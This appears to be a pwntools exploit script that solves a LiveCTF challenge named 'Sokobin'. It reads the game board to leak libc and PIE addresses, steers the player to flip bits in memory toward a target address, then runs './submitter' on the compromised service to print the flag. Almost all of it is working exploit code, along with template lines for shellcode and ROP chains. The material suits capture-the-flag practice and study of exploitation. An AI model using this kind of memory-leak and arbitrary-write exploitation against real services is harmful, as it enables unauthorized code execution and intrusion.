#!/usr/bin/env python3

from pwn import *
# import IPython

# elf = ELF("/home/livectf/challenge_patched")
# elf = ELF("./challenge")
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-linux-x86-64.so.2")

# context.binary = elf

context.arch = "amd64"
context.encoding = 'latin-1'

def proc(*a, **k):
    if args.REMOTE: return remote(HOST, PORT)
    if args.GDB:  return gdb.debug(*a, **k, gdbscript=gdbscript)
    return process(*a, **k)

attach = lambda: gdb.attach(p) if not args.REMOTE else None
# embed  = lambda: IPython.embed(colors="neutral")

lhex = lambda p, v: log.info("%s %#lx" % (p, v))
phex = lambda v: log.info("%#lx" % v)

b2i = lambda b: int.from_bytes(b, 'little')

r   = lambda *a, **k: p.recv(*a, **k)
rl  = lambda *a, **k: p.recvline(*a, **k)
ru  = lambda *a, **k: p.recvuntil(*a, **k)
s   = lambda *a, **k: p.send(*a, **k)
sl  = lambda *a, **k: p.sendline(*a, **k)
sla = lambda *a, **k: p.sendlineafter(*a, **k)
sm  = lambda *a, **k: (ru(MENU_PROMPT), s(*a, **k))
slm = lambda *a, **k: (ru(MENU_PROMPT), sl(*a, **k))

REMOTESTR = " " # e.g. "nc hostname 1337"
REMOTESEP = " "
HOST, PORT = REMOTESTR.split(REMOTESEP)[-2:]

MENU_PROMPT = b"> "

################################################################################

#elf.got['puts'] elf.sym['main']

#shellcode = asm(""" """)
#shellcode = asm(shellcraft.sh())

#alphabet = string.ascii_lowercase
#payload = cyclic(256, alphabet=alphabet)
#offset = cyclic_find(b"", alphabet=alphabet)

#lleak = px.lib_leak(out, idx=0, pid=p.pid)
#bleaks, hleaks, lleaks, sleaks = px.all_leaks(out, pid=p.pid)

#rop_chain = []
#rop_chain = b''.join(map(p64, rop_chain))

gdbscript = """

"""
context.arch        ='amd64'
CHALLENGE = './challenge'
IP = "0.0.0.0"
PORT = 31337
TEAM = 1
'''
Libc Lib:
    https://libc.rip/
'''
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# DEBUG = True if len(sys.argv) > 1 else True

# p = remote(IP,PORT)
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


p = remote(HOST, int(PORT))
def receive_board():
    """Receive and parse the game board"""
    board = []
    p.recvuntil(b"Sokobin!\n")

    for _ in range(32):  # 32 rows
        line = p.recvline().decode().strip()
        board.append(line)

    for y, row in enumerate(board):
        if '@' in row:
            x = row.index('@')
            player_pos = (x, 31-y)  # Convert to 0-indexed from bottom
            break

    return (board, player_pos)

def print_board_numbers(board):
    board_numbers = []
    for line in board:
        # chunk line into 4-byte segments
        chunks = [line[i:i+8] for i in range(0, len(line), 8)]
        n = []
        for chunk in chunks:
            byte = int(chunk[::-1].replace(".", "0").replace("o", "1").replace("@", "0"), 2)
            n.append(byte)

        board_numbers.append(struct.unpack("<I", bytes(n))[0])
    return board_numbers


UP='w'
LEFT='a'
RIGHT='s'
DOWN='r'

def get_pos():
    (board, pos) = receive_board()
    p.sendline(' ')
    (board, pos) = receive_board()
    return pos

def send_move(move):
    (board, pos) = receive_board()
    p.sendline(move)
    return (board, pos)

(board, pos) = send_move(' ')
board_nums = print_board_numbers(board)
libc_leak = u64(p32(board_nums[11]) + p32(board_nums[10]))
pie_leak = u64(p32(board_nums[13]) + p32(board_nums[12]))
# for i in range(0, 16):
#     print(f"{i}: {u64(p32(board_nums[i*2+1]) + p32(board_nums[i*2])):x}")
# print(f"{pie_leak=:#x}")

def move_until_x(direction, target):
    while (get_pos()[0] != target):
        #print("x", get_pos())
        send_move(direction)

def move_until_y(direction, target, debug=False):
    while (get_pos()[1] != target):
        if debug:
            print("y", get_pos())
        send_move(direction)

send_move(UP)
send_move(RIGHT*5)
send_move(DOWN)
send_move(RIGHT*5)
send_move(DOWN)
send_move(RIGHT*13)
send_move(UP)
send_move(RIGHT*8)
send_move(UP*32)
send_move(LEFT + (UP * 4) + LEFT + (UP * 8) + RIGHT)
send_move(DOWN)
#send_move(LEFT*32)
#send_move(DOWN)

def debug():
    p.recvuntil(b"Sokobin!\n")

    board = b""
    for i in range(32):  # 32 rows
        line = p.recvline()
        print(31-i, line)
        board += line
    p.unrecv(b"Sokobin!\n" + board)


def clean(lines):
    for _ in range(lines):
        (board, pos) = send_move(LEFT*32)
        send_move(RIGHT*32)
        send_move(DOWN)
clean(24)
#send_move((LEFT*32) + (UP*32))
move_until_x(LEFT, 0)

for _ in range(32):
    move_until_y(UP, 15)
    move_until_y(DOWN, 7)
    send_move(RIGHT)

# WRITE START

send_move(LEFT*2)

MAX_BITS_AVAIL = 13
bits_avail = MAX_BITS_AVAIL

# pop a bit
def pop_one():
    global bits_avail
    move_until_y(UP, 31)
    if bits_avail == 0:
        print("HIT")
        clean(16)
        bits_avail = MAX_BITS_AVAIL
        move_until_x(LEFT, 29)
        # debug()
        move_until_y(UP, 31)

    # debug()
    move_until_x(LEFT, 1)

    send_move(DOWN*((MAX_BITS_AVAIL-bits_avail) + 1))
    move_until_y(UP, 31)
    move_until_x(RIGHT, 29)
    move_until_y(DOWN, 14)
    move_until_x(LEFT, 0)
    send_move(UP)
    move_until_x(RIGHT, 29)
    send_move(UP + RIGHT)

    bits_avail -= 1

pop_one()

# debug()


target = pie_leak - 36
for (idx, b) in enumerate(bin(target)[2:][::-1]):
    row = [10, 11][idx>31]
    row_idx = idx % 32
    # print(f"{row_idx=}, {row=} {b=}")
    if b == '1':
        if row_idx < 30:
            move_until_y(DOWN, row+1)
            send_move(RIGHT + DOWN)
            move_until_x(LEFT, row_idx+1)
            move_until_y(UP, 14)
            # debug()
            move_until_x(RIGHT, 30)
            send_move(LEFT)
        elif row_idx == 30:
            move_until_y(DOWN, row+1)
            send_move(UP + LEFT)
            move_until_y(UP, 14)
        else:
            send_move(LEFT + DOWN + RIGHT + UP + RIGHT)
            move_until_y(DOWN, row+1)
            send_move(UP + LEFT + LEFT)
            move_until_y(UP, 14)

        pop_one()

# debug()

(board, pos) = send_move(' ')
board_nums = print_board_numbers(board)
for i in range(0, 16):
    print(f"{i}: {u64(p32(board_nums[i*2+1]) + p32(board_nums[i*2])):x}")
    #else:

p.sendline('q')
p.sendline('./submitter')
print(p.recvline_contains(b'LiveCTF{').decode().strip())
# print(p.read())
#attach()

#
#send_move(RIGHT * 31)
##send_move(DOWN * 7)
#for _ in range(8):
#    send_move(DOWN)
#send_move(LEFT * 30)
#send_move(UP * 8)

#for _ in range(30):
#    send_move(UP)
#send_move(LEFT * 30)
#attach()
exit(1)
p.close()

# p.interactive()


